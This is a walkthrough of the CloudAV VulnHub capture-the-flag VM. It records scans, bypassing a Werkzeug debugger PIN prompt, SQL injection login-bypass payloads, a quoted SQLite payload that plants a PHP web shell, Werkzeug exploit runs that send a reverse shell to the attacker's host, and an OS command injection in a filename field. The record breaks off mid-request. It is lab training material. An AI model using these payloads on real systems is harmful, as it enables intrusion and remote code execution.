@@ -1,0 +1,2278 @@
+=========================================================================
+Walkthrough of the BoredHackerBlog CloudAV VulnHub VM CTF
+=========================================================================
+
+Step 1. Scanning & Enumeration (Nmap + Nikto + Dirb + Burp)
+
+Step 2. Gaining access
+
+        2.1. Log into the Website
+        > Option a. The value of the 'invite code' is disclosed in a error message if we enter a payload like ";
+        > Option b. Exploit a simple SQL injection vulnerability to bypass the authentication in the 'login' page
+        > Option c. Bruteforce the 'invite code' field (trivial valid value = pasword)
+
+        2.2. Exploit an OS command injection vulnerability in the 'scan' page
+        2.3. Obtain a reverse shell with the account 'scanner'
+
+        Other options/notes: 
+        -------------------	
+        > The username 'scanner' is disclosed in the 'scan' page and since the SSH service is not filtered we can perform a bruteforce attack
+          and discover that its password is scanner (login=password). Then log into the Linux server with the creds.
+        > A werkzeug python debugging interface is reachable and may be used to get a remote shell however I did not managed to exploit it and got 405 and 404 error messages.
+         (Note: the 'pin code' protection is a 'client-side' control that can be bypassed by simply deleting a few Javascript lines in the HTTP responses)
+
+Step 3. Post-exploitation - Linux enumeration (Manual + LinEnum.sh + Linux-exploit-suggester.sh)
+
+Step 4. Privilege escalation to root
+
+        An SUID root binary 'update_cloudav' is vulnerable to an OS command injection
+        => OS command execution as ROOT
+
+
+===================================================================================================================================
+Step 1. Scanning & Enumeration (Nmap + Nikto + Dirb + Burp)
+===================================================================================================================================
+
+
+jeff@kali:~/Documents/CTFs$ sudo nmap -Pn -sS -sV -p- sC -v 192.168.1.5
+	Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-25 01:57 CEST
+	NSE: Loaded 45 scripts for scanning.
+	Failed to resolve "sC".
+	Initiating ARP Ping Scan at 01:57
+	Scanning 192.168.1.5 [1 port]
+	Completed ARP Ping Scan at 01:57, 0.05s elapsed (1 total hosts)
+	Initiating Parallel DNS resolution of 1 host. at 01:57
+	Completed Parallel DNS resolution of 1 host. at 01:57, 0.00s elapsed
+	Initiating SYN Stealth Scan at 01:57
+	Scanning 192.168.1.5 [65535 ports]
+	Discovered open port 8080/tcp on 192.168.1.5
+	Discovered open port 22/tcp on 192.168.1.5
+	Completed SYN Stealth Scan at 01:57, 15.59s elapsed (65535 total ports)
+	Initiating Service scan at 01:57
+	Scanning 2 services on 192.168.1.5
+	Completed Service scan at 01:57, 6.20s elapsed (2 services on 1 host)
+	NSE: Script scanning 192.168.1.5.
+	Initiating NSE at 01:57
+	Completed NSE at 01:57, 0.14s elapsed
+	Initiating NSE at 01:57
+	Completed NSE at 01:57, 0.01s elapsed
+	Nmap scan report for 192.168.1.5
+	Host is up (0.00018s latency).
+	Not shown: 65533 closed ports
+
+	PORT     STATE SERVICE VERSION
+
+	22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+
+	8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
+
+	MAC Address: 08:00:27:F4:CF:9F (Oracle VirtualBox virtual NIC)
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+	Read data files from: /usr/bin/../share/nmap
+	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+	Nmap done: 1 IP address (1 host up) scanned in 22.60 seconds
+		   Raw packets sent: 66077 (2.907MB) | Rcvd: 66077 (2.643MB)
+
+
+======================================================================================================
+
+jeff@kali:~/Documents/CTFs$ nikto -h http://192.168.1.5:8080
+
+	- Nikto v2.1.6
+	---------------------------------------------------------------------------
+	+ Target IP:          192.168.1.5
+	+ Target Hostname:    192.168.1.5
+	+ Target Port:        8080
+	+ Start Time:         2020-04-25 02:04:16 (GMT2)
+	---------------------------------------------------------------------------
+	+ Server: Werkzeug/0.14.1 Python/2.7.15rc1
+	+ The anti-clickjacking X-Frame-Options header is not present.
+	+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+	+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+	+ No CGI Directories found (use '-C all' to force check all possible dirs)
+	+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+	+ OSVDB-3092: /console: This might be interesting...
+	+ ERROR: Error limit (20) reached for host, giving up. Last error: invalid HTTP response
+	+ Scan terminated:  11 error(s) and 5 item(s) reported on remote host
+	+ End Time:           2020-04-25 02:05:29 (GMT2) (73 seconds)
+	---------------------------------------------------------------------------
+	+ 1 host(s) tested
+
+
+======================================================================================================
+
+jeff@kali:~/Documents/CTFs$ dirb http://192.168.1.5:8080
+
+	-----------------
+	DIRB v2.22    
+	By The Dark Raver
+	-----------------
+
+	START_TIME: Sat Apr 25 02:12:28 2020
+	URL_BASE: http://192.168.1.5:8080/
+	WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+	-----------------
+
+	GENERATED WORDS: 4612                                                          
+
+	---- Scanning URL: http://192.168.1.5:8080/ ----
+	+ http://192.168.1.5:8080/console (CODE:200|SIZE:1985)
+	+ http://192.168.1.5:8080/login (CODE:405|SIZE:178)
+	+ http://192.168.1.5:8080/output (CODE:405|SIZE:178)
+	+ http://192.168.1.5:8080/scan (CODE:200|SIZE:48)
+		                                                                                                                                                                                                
+	-----------------
+	END_TIME: Sat Apr 25 02:13:15 2020
+	DOWNLOADED: 4612 - FOUND: 4
+
+
+======================================================================================================
+Burp proxy
+======================================================================================================
+
+
+GET /console HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1985
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 00:05:40 GMT
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+  "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+  <head>
+    <title>Console // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
+        type="text/css">
+    <!-- We need to make sure this has a favicon so that the debugger does
+         not by accident trigger a request to /favicon.ico which might
+         change the application state. -->
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script type="text/javascript">
+      var TRACEBACK = -1,
+          CONSOLE_MODE = true,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "3g3phTEmejEAzd3eMcyH";
+    </script>
+  </head>
+  <body style="background-color: #fff">
+    <div class="debugger">
+<h1>Interactive Console</h1>
+<div class="explanation">
+In this console you can execute Python expressions in the context of the
+application.  The initial namespace was created by the debugger automatically.
+</div>
+<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
+      <div class="footer">
+        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+        friendly Werkzeug powered traceback interpreter.
+      </div>
+    </div>
+
+    <div class="pin-prompt">
+      <div class="inner">
+        <h3>Console Locked</h3>
+        <p>
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        <form>
+          <p>PIN:
+            <input type=text name=pin size=14>
+            <input type=submit name=btn value="Confirm Pin">
+        </form>
+      </div>
+    </div>
+  </body>
+</html>
+
+----------------------------------------------
+
+GET /console HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 1504
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 00:12:55 GMT
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+  "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+  <head>
+    <title>Console // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
+        type="text/css">
+    <!-- We need to make sure this has a favicon so that the debugger does
+         not by accident trigger a request to /favicon.ico which might
+         change the application state. -->
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script type="text/javascript">
+      var TRACEBACK = -1,
+          CONSOLE_MODE = true,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "3g3phTEmejEAzd3eMcyH";
+    </script>
+  </head>
+  <body style="background-color: #fff">
+    <div class="debugger">
+<h1>Interactive Console</h1>
+<div class="explanation">
+In this console you can execute Python expressions in the context of the
+application.  The initial namespace was created by the debugger automatically.
+</div>
+<div class="console"><div class="inner">The Console requires JavaScript.</div></div>
+      <div class="footer">
+        Brought to you by <strong class="arthur">DON'T PANIC</strong>, your
+        friendly Werkzeug powered traceback interpreter.
+      </div>
+    </div>
+</html>
+
+
+
+
+I edited the HTTP response above with Burp proxy and deleted the following piece of code:
+-----------------------------------------------------------------------------------------
+
+    <div class="pin-prompt">
+      <div class="inner">
+        <h3>Console Locked</h3>
+        <p>
+          The console is locked and needs to be unlocked by entering the PIN.
+          You can find the PIN printed out on the standard output of your
+          shell that runs the server.
+        <form>
+          <p>PIN:
+            <input type=text name=pin size=14>
+            <input type=submit name=btn value="Confirm Pin">
+        </form>
+      </div>
+    </div>
+  </body>
+
+
+=> I have now acces to a Python debug Web console "werkzeug traceback interpreter"
+
+
+jeff@kali:~/Documents/CTFs/CloudAV$ searchsploit Werkzeug
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ Exploit Title                                                                                                                                                  |  Path (/usr/share/exploitdb/)
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Werkzeug - 'Debug Shell' Command Execution                                                                                                                      | exploits/multiple/remote/43905.py
+Werkzeug - Debug Shell Command Execution (Metasploit)                                                                                                           | exploits/python/remote/37814.rb
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Shellcodes: No Result
+
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ wget https://raw.githubusercontent.com/its-arun/Werkzeug-Debug-RCE/master/werkzeug.py
+--2020-04-25 02:40:24--  https://raw.githubusercontent.com/its-arun/Werkzeug-Debug-RCE/master/werkzeug.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.120.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.120.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1043 (1.0K) [text/plain]
+Saving to: ‘werkzeug.py’
+
+werkzeug.py  100%[=============================================================================================================>]   1.02K  --.-KB/s    in 0s
+2020-04-25 02:40:24 (41.0 MB/s) - ‘werkzeug.py’ saved [1043/1043]
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ chmod +x werkzeug.py 
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ ./werkzeug.py 192.168.1.5:8080 id
+[+] SECRET is: 3g3phTEmejEAzd3eMcyH
+[+] Script will try executing id on 192.168.1.5:8080
+Press any key to execute
+[+] response from server
+status code: 404
+response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>
+
+
+---------------------------------------------------------------
+
+
+msf5 exploit(multi/http/werkzeug_debug_rce) > options
+
+Module options (exploit/multi/http/werkzeug_debug_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /console         yes       URI to the console
+   VHOST                       no        HTTP server virtual host
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   werkzeug 0.10 and older
+
+
+msf5 exploit(multi/http/werkzeug_debug_rce) > set rhosts 192.168.1.5
+rhosts => 192.168.1.5
+
+msf5 exploit(multi/http/werkzeug_debug_rce) > set rport 8080
+rport => 8080
+
+msf5 exploit(multi/http/werkzeug_debug_rce) > run
+
+[*] Started reverse TCP handler on 192.168.1.22:4444 
+[*] Exploit completed, but no session was created.
+
+
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ wget https://raw.githubusercontent.com/Fare9/PyWerkzeug-Debug-Command-Execution/master/exploit_werkzeug.py
+--2020-04-25 05:54:14--  https://raw.githubusercontent.com/Fare9/PyWerkzeug-Debug-Command-Execution/master/exploit_werkzeug.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.120.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.120.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1802 (1.8K) [text/plain]
+Saving to: ‘exploit_werkzeug.py’
+
+exploit_werkzeug.py                                100%[=============================================================================================================>]   1.76K  --.-KB/s    in 0s      
+
+2020-04-25 05:54:14 (23.1 MB/s) - ‘exploit_werkzeug.py’ saved [1802/1802]
+
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ ls -al
+total 136
+drwxr-xr-x  2 jeff jeff   4096 Apr 25 05:54 .
+drwxr-xr-x 25 jeff jeff   4096 Apr 25 01:55 ..
+-rw-r--r--  1 root root    454 Apr 25 04:25 Burp-SQLi
+-rwxr-xr-x  1 jeff jeff   1802 Apr 25 05:54 exploit_werkzeug.py
+-rw-r--r--  1 jeff jeff 115352 Apr 25 05:52 Walkthrough-CloudAntivirus
+-rwxr-xr-x  1 jeff jeff   1043 Apr 25 02:40 werkzeug.py
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ ./exploit_werkzeug.py 192.168.1.5 192.168.1.22 1234
+USAGE: python ./exploit_werkzeug.py <ip> <port> <your ip> <netcat port>
+
+
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ ./exploit_werkzeug.py 192.168.1.5 8080 192.168.1.22 1234
+[+] SECRET is: euOQhKfcZjQRyk1zU8kf
+[+] Sending reverse shell to 192.168.1.5:8080, please remember you have to use netcat listening in 192.168.1.22:1234
+PRESS ENTER TO EXPLOIT
+[+] response from server
+status code: 404
+response: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>
+
+
+
+===================================================================================================================================
+Step 2. Gaining access
+===================================================================================================================================
+
+
+2.1. Log into the Website
+===================================================================================================================================
+
+> Option a. The value of the 'invite code' is disclosed in a error message if we enter a payload like ";
+-----------------------------------------------------------------------------------------------------------------------------------
+
+POST http://192.168.1.5:8080/login HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+password=";
+
+=> THE Web page displays a verbose SQLite error message "sqlite3.OperationalError - OperationalError: unrecognized token: """"" "
+
+HTTP/1.0 500 INTERNAL SERVER ERROR
+Content-Type: text/html; charset=utf-8
+X-XSS-Protection: 0
+Connection: close
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 05:13:38 GMT
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+  "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+  <head>
+    <title>Warning: You can only execute one statement at a time. // Werkzeug Debugger</title>
+    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css"
+        type="text/css">
+    <!-- We need to make sure this has a favicon so that the debugger does
+         not by accident trigger a request to /favicon.ico which might
+         change the application state. -->
+    <link rel="shortcut icon"
+        href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=jquery.js"></script>
+    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
+    <script type="text/javascript">
+      var TRACEBACK = 139636208713040,
+          CONSOLE_MODE = false,
+          EVALEX = true,
+          EVALEX_TRUSTED = false,
+          SECRET = "euOQhKfcZjQRyk1zU8kf";
+      
+<SNIP>     
+<pre class="line before"><span class="ws"></span>@app.route('/login', methods=['POST'])</pre>
+<pre class="line before"><span class="ws"></span>def login():</pre>
+<pre class="line before"><span class="ws">    </span>password = request.form['password']</pre>
+<pre class="line current"><span class="ws">    </span>if len(c.execute('select * from code where password=&quot;' + password + '&quot;').fetchall()) &gt; 0:</pre>
+
+</div>
+
+
+=> The HTTP response contains the password "password" that can be used to log into the website !!!
+   
+   
+   
+> Option b. Exploit a simple SQl injection vulnerability to bypass the authentication in the 'login' page   
+------------------------------------------------------------------------------------------------------------------
+   
+jeff@kali:~/Documents/CTFs/CloudAntivirus$ sudo sqlmap --is-dba -level=3 -risk=3 -r Burp-SQLi --technique=BEUS
+[sudo] password for jeff: 
+        ___
+       __H__                                                                                                                                                                                             
+ ___ ___[']_____ ___ ___  {1.4.3#stable}                                                                                                                                                                 
+|_ -| . [']     | .'| . |                                                                                                                                                                                
+|___|_  [']_|_|_|__,|  _|                                                                                                                                                                                
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                              
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:40:41 /2020-04-25/
+
+[05:40:41] [INFO] parsing HTTP request from 'Burp-SQLi'
+custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
+[05:40:44] [INFO] testing connection to the target URL
+[05:40:44] [INFO] checking if the target is protected by some kind of WAF/IPS
+[05:40:44] [INFO] testing if the target URL content is stable
+[05:40:45] [INFO] target URL content is stable
+[05:40:45] [INFO] testing if (custom) POST parameter '#1*' is dynamic
+[05:40:45] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
+[05:40:45] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
+[05:40:45] [INFO] testing for SQL injection on (custom) POST parameter '#1*'
+[05:40:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[05:40:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+got a refresh intent (redirect like response common to login pages) to '/scan'. Do you want to apply it from now on? [Y/n] n
+[05:40:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[05:40:54] [INFO] (custom) POST parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable 
+[05:40:55] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+<SNIP>
+
+sqlmap identified the following injection point(s) with a total of 288 HTTP(s) requests:
+---
+Parameter: #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: password=" OR NOT 5471=5471 AND "mYis"="mYis
+---
+[05:41:29] [INFO] testing SQLite
+[05:41:29] [INFO] confirming SQLite
+[05:41:29] [INFO] actively fingerprinting SQLite
+[05:41:29] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[05:41:29] [WARNING] on SQLite the current user has all privileges
+current user is DBA: True
+[05:41:29] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 154 times
+[05:41:29] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.5'
+
+[*] ending @ 05:41:29 /2020-04-25/
+
+
+=> The following payload can be used to bypass the authentication: " OR "mYis"="mYis  
+   I could have guessed it since it is a classic payload used to bypass authentication (no need of SQLmap)
+  
+
+POST /login HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOxvw.KkmUT01ED3dH26_-ROVy0IqP7Is
+Upgrade-Insecure-Requests: 1
+
+password=%22+OR+%22mYis%22%3D%22mYis
+
+------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 74
+Vary: Cookie
+Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOyYw.fsUF_D2W3Qb_n5mC5FuuDdGbIqA; HttpOnly; Path=/
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 03:45:39 GMT
+
+Redirecting to /scan. <meta http-equiv="refresh" content="0; url=/scan" />
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
+GET /scan HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOyYw.fsUF_D2W3Qb_n5mC5FuuDdGbIqA
+Upgrade-Insecure-Requests: 1
+
+--------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 689
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 03:45:43 GMT
+
+<html> 
+<body>
+<h1>Cloud Anti-Virus Scanner!</h1>
+<h3>Try scanning some of these files with our scanner!</h3>
+<pre>total 4756
+-rwxr-xr-x 1 scanner scanner 1113504 Oct 21  2018 bash
+-rwxr-xr-x 1 scanner scanner   34888 Oct 21  2018 bzip2
+-rwxr-xr-x 1 scanner scanner   35064 Oct 21  2018 cat
+-rw-rw-r-- 1 scanner scanner      68 Oct 21  2018 eicar
+-rw-rw-r-- 1 scanner scanner       5 Oct 21  2018 hello
+-rwxr-xr-x 1 scanner scanner   35312 Oct 21  2018 netcat
+-rwxr-xr-x 1 scanner scanner 3633560 Oct 21  2018 python
+</pre>
+<form action="/output" method="POST">
+  <input type="filename" name="filename" placeholder="File Name">
+  <input type="submit" value="Scan!">
+</form>
+</body>
+</html>
+
+
+Other - Not tested
+-------------------
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
+
+Remote Command Execution using SQLite command - Attach Database
+
+ATTACH DATABASE '/var/www/lol.php' AS lol;
+CREATE TABLE lol.pwn (dataz text);
+INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
+
+
+
+> Option c. Bruteforce the 'invite code' field (trivial valid value = pasword)
+-----------------------------------------------------------------------------------------------------------------------------------
+
+POST /login HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 17
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+password=password
+
+----------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 74
+Vary: Cookie
+Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSSw.XXMuSC7Sgs7Wr_L9e5Pvs0iQYrM; HttpOnly; Path=/
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 01:28:43 GMT
+
+Redirecting to /scan. <meta http-equiv="refresh" content="0; url=/scan" />
+
+
+
+
+-------------------------------------------------------------------------------------------------
+
+GET /scan HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSSw.XXMuSC7Sgs7Wr_L9e5Pvs0iQYrM
+Upgrade-Insecure-Requests: 1
+
+--------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 689
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 01:28:43 GMT
+
+<html> 
+<body>
+<h1>Cloud Anti-Virus Scanner!</h1>
+<h3>Try scanning some of these files with our scanner!</h3>
+<pre>total 4756
+-rwxr-xr-x 1 scanner scanner 1113504 Oct 21  2018 bash
+-rwxr-xr-x 1 scanner scanner   34888 Oct 21  2018 bzip2
+-rwxr-xr-x 1 scanner scanner   35064 Oct 21  2018 cat
+-rw-rw-r-- 1 scanner scanner      68 Oct 21  2018 eicar
+-rw-rw-r-- 1 scanner scanner       5 Oct 21  2018 hello
+-rwxr-xr-x 1 scanner scanner   35312 Oct 21  2018 netcat
+-rwxr-xr-x 1 scanner scanner 3633560 Oct 21  2018 python
+</pre>
+<form action="/output" method="POST">
+  <input type="filename" name="filename" placeholder="File Name">
+  <input type="submit" value="Scan!">
+</form>
+</body>
+</html>
+
+
+2.2. Identify and exploit an OS command injection vulnerability in the 'scan' page
+===================================================================================================================================	
+
+POST /output HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/scan
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSZg.57mt5YvaZ9ZL3xr7vOA2gnSy4aU
+Upgrade-Insecure-Requests: 1
+
+filename=
+
+---------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 318
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 01:29:51 GMT
+
+<pre>/home/scanner/cloudav_app/database.sql: OK
+/home/scanner/cloudav_app/app.py: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 6838622
+Engine version: 0.102.2
+Scanned directories: 1
+Scanned files: 2
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 30.035 sec (0 m 30 s)
+</pre>
+
+
+----------------------------------------------------------------------------------------------------
+
+POST /output HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/scan
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+Connection: close
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.XqOSZg.57mt5YvaZ9ZL3xr7vOA2gnSy4aU
+Upgrade-Insecure-Requests: 1
+
+filename=/etc/passwd || echo test > /home/scanner/cloudav_app/test.txt
+
+-------------------
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 254
+Vary: Cookie
+Server: Werkzeug/0.14.1 Python/2.7.15rc1
+Date: Sat, 25 Apr 2020 01:58:50 GMT
+
+<pre>/etc/passwd: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 6838622
+Engine version: 0.102.2
+Scanned directories: 0
+Scanned files: 1
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 40.130 sec (0 m 40 s)
+</pre>
+
+
+--------------------------------------------------------------------------------------------------------
+
+POST /output HTTP/1.1
+Host: 192.168.1.5:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.5:8080/scan
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 44
+Connection: close
